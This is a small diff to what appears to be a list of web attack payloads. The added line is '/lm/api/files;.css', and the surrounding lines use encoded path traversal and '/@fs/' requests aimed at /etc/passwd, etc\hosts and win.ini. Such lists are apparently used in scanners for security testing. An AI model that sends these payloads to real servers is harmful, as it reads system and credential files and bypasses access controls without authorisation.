@@ -25,3 +25,4 @@
 /\%2E%2E\%2E%2E\%2E%2E\%2E%2E\%2E%2E\%2E%2E\%2E%2E\etc\hosts
 /@fs/etc/passwd?import&raw??
 /@fs/C://Windows/win.ini?import&raw??
+/lm/api/files;.css
